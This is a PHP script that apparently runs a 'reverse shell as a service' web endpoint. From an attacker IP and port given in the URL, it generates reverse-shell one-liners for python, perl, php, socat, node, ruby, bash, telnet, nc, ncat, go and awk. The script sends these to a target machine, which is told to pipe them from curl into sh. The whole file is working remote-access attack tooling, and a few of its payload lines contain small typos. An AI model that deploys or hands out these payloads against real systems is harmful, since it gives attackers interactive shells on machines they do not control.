<?php
header("Content-Type: text");

echo "# Reverse Shell as a Service
# https://github.com/Nickguitar/reverse-shell
#
# 1. On your machine:
#      nc -l 7359\n#
# 2. On the target machine:
#      curl r.0x7359.com/yourip:7359 | sh
#
# Use 'curl r.0x7359.com/yourip:7359:type | sh' to choose a specific shell
# E.g.: r.0x7359.com/127.0.0.1:7359:php3
\n\n\n";

$s = isset($_GET['x']) ? explode(":",$_GET['x']) : "";
if(!isset($s[1])) die();

$payloads = [
	"python" => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$s[0]\",$s[1]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
	"python2" => "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$s[0]\",$s[1]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
	"python3" => "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"$s[0]\",$s[1]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
	"python4" => "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"$s[0]\",$s[1]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
	
	"perl" => "perl -e 'use Socket;\$i=\"127.0.0.1\";\$p=7359;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet-aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
	"perl2" => "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$s[0]:$s[1]\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'",
	
	"php" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);exec(\"/bin/sh <&3 >&3 2>&3\");'",
	"php2" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);system(\"/bin/sh <&3 >&3 2>&3\");'",
	"php3" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);shell-exec(\"/bin/sh <&3 >&3 2>&3\");'",
	"php4" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);system(\"/bin/sh <&3 >&3 2>&3\");'",
	"php5" => "php -r '\$k=fsockopen(\"$s[0]\",$s[1]);passthru(\"/bin/sh <&3 >&3 2>&3\");'",
	"php6" => "php -r '\$s=fsockopen(\"$s[0]\",$s[1]);popen(\"/bin/bash <&3 >&3 2>&3\", \"r\");'",
	"php7" => "php -r '\$s=fsockopen(\"$s[0]\",$s[1]);\$p=proc_open(\"/bin/bash\", array(0=>\$s, 1=>\$s, 2=>\$s),\$i);'",
	"php8" => "php -r '\$s=fsockopen(\"$s[0]\",$s[1]);`/bin/bash <&3 >&3 2>&3`;'",

	"socat" => "socat TCP:$s[0]:$s[1] EXEC:/bin/bash",
	"socat2" => "socat TCP:$s[0]:$s[1] EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",

	"node" => "node -e \"require('child_process').exec('/bin/bash -i >& /dev/tcp/$s[0]/$s[1] 0>&1')\"",

	"ruby" => "ruby -rsocket -e\"exit if fork;c=TCPSocket.new('$s[0]','$s[1]');loop{c.gets.chomp!;(exit\\! if \$_=='exit');(\$_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen(\$_,?r){|io|c.print io.read}))}\"",
	"ruby2" => "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$s[0]\",$s[1]))'",
	
	"bash" => "/bin/bash -i >& /dev/tcp/$s[0]/$s[1] 0>&1",
	"bash2" => "bash -c \"/bin/bash -i >& /dev/tcp/$s[0]/$s[1] 0>&1\"",
	"sh" => "/bin/sh -i >& /dev/tcp/$s[0]/$s[1] 0>&1",
	
	"telnet" => "TF=\$(mktemp -u);mkfifo \$TF && telnet $s[0] $s[1] 0<\$TF | /bin/bash 1>\$TF",
	
	"nc" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $s[0] $s[1] >/tmp/f",
	"nc2" => "nc.traditional -e /bin/bash $s[0] $[1]",
	
	"ncat" => "ncat $s[0] $s[1] -e /bin/bash",
	"ncat2" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u $s[0] $s[1] >/tmp/f",

	"go" => "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$s[0]:$s[1]\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
	"awk" => "awk 'BEGIN {s = \"/inet/tcp/0/$s[0]/$s[1]\"; while(42) { do{ printf \"$ \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
];

foreach($payloads as $name => $cmd)
	if(!isset($s[2]))
		echo "# Type: ".$name."\nif command -v ".explode(' ',$cmd)[0]." > /dev/null 2>&1; then\n\t$cmd\n\texit;\nfi\n\n";
	else
		if($name == $s[2])
			if(preg_match("/(telnet|ncat2)/", $name))
				die("$cmd;exit");
			else
				die("if command -v ".explode(' ',$cmd)[0]." > /dev/null 2>&1; then\n\t$cmd\n\texit;\nfi\n\n");
